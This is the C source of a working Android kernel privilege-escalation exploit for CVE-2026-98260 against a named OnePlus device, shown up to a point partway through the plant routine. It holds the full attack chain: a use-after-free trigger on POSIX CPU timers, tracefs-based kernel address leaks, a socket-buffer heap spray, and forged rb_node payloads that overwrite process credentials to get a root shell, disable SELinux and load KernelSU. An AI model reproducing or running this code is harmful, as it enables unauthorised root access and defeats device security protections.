/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : OnePlus PLZ110 (SM8850 / canoe), Android 17
 * Kernel : 6.12.69-android16-6-g242e1a07f878-ab15865446-4k
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * The trigger, slab layout and offsets are the same; the do_timer_create
 * call site and the tracefs event ids are per-build and are re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android16-6.12 module.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 *
 * ---------------------------------------------------------------------------
 * GhostLock port notes (2026-10-28, B1):
 *   - Source: YuKongA/CVE-2026-98260 @ ad1f4e7 (MIT), adapted from
 *     woshigenm/CVE-2026-98260 (MIT). GhostLock keeps the trigger/reclaim/
 *     endgame semantics unchanged; only per-build constants are redirected
 *     to runtime `struct glk98260_params` (params.h, argv `--params`).
 *   - Added stable stdout markers (markers.h) so the service-side Flow can
 *     parse progress without interpreting kernel-side log text.
 *   - fake chain order is REORDERED vs upstream (SELinux off -> panic_on_warn
 *     -> fake_cred -> fake_uid) to avoid a panic_on_warn=1 hard panic before
 *     the sysctl is writable; see glk98260_run_fake().
 *   - Diagnostic modes (ids/leak/shell) are compiled only with
 *     GLK98260_ENABLE_DIAGNOSTIC (Debug builds).
 *   - Never kill/timeout/reap an armed helper; park is the only safe state.
 * ---------------------------------------------------------------------------
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include "markers.h"
#include "params.h"

/* ---- 目标无关调参（编译期单一权威；不进口 profile，见 params.h 注释） ---- */
#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
/* SOCKBUF/PAGE 及全部每构建常量由 params.h 提供（运行时 P）。 */

/* child<->parent 协议魔数（代码协议，不进口 profile） */
#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
static int g_armed_marker;
static const char *g_params_arg;
static const char *g_finish_script;
static const char *g_run_id;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

/** 读取小文本文件（最多 cap-1 B，NUL 结尾）；失败返回 -1。 */
static int glk_read_text(const char *path, char *buf, size_t cap)
{
    int fd = open(path, O_RDONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    n = read(fd, buf, cap - 1U);
    close(fd);
    if (n < 0)
        return -1;
    buf[n] = '\0';
    return (int)n;
}

/** @return 当前进程 SELinux 域（去行尾/换行；失败返回空串）。 */
static const char *glk_self_domain(void)
{
    static char domain[128];
    size_t n;

    if (glk_read_text("/proc/self/attr/current", domain, sizeof(domain)) <= 0) {
        domain[0] = '\0';
        return domain;
    }
    n = strlen(domain);
    while (n > 0U && (domain[n - 1U] == '\n' || domain[n - 1U] == '\0'))
        domain[--n] = '\0';
    return domain;
}

/**
 * @brief 运行前自检并打印 ENV marker（失败时未 armed）。
 * @return NULL=通过；否则具名 reason（`uid-not-shell` 等）。
 * @note 只读 /proc 与 /sys/kernel/slab/<cache>/order；不写文件、不发信号。
 */
static const char *glk_preflight_env(void)
{
    struct utsname un;
    char order[32];
    const char *domain = glk_self_domain();
    const char *release = "unknown";

    if (uname(&un) == 0)
        release = un.release;
    logf(GLK_MARK_ENV " pid=%d uid=%ld domain=%s release=%s\n",
         (int)getpid(), (long)getuid(), domain, release);
    if (getuid() != 2000)
        return "uid-not-shell";
    if (strstr(domain, "u:r:shell:s0") == NULL)
        return "domain-not-shell";
    if ((unsigned long)getpagesize() != (unsigned long)P.page_size)
        return "page-size";
    if (glk_read_text("/sys/kernel/slab/posix_timers_cache/order",
                      order, sizeof(order)) <= 0)
        return "slab-order-unreadable";
    if (strtoull(order, NULL, 10) != P.slab_order)
        return "slab-order";
    return NULL;
}

/** 首次释放 timer_go 前打印 ARMED（唯一不可逆点；append-only 一次）。 */
static void glk_mark_armed_once(void)
{
    if (!g_armed_marker) {
        g_armed_marker = 1;
        logf(GLK_MARK_ARMED "=1\n");
    }
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
            req != 0x1640 && alloc != 0x1640)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h;

            /* 参数化：投票前先按 profile 的 base 窗口过滤。 */
            if (base < BASE_MIN || base > BASE_MAX)
                continue;
            h = (unsigned)((base >> 12) * 2654435761u) & (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                /* 参数化：候选基址必须落在 profile 的 base 窗口内（否则丢弃）。 */
                if (base < BASE_MIN || base > BASE_MAX)
                    continue;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 2000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    logf(GLK_MARK_PARKED "=%s\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst))
        sched_yield();
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
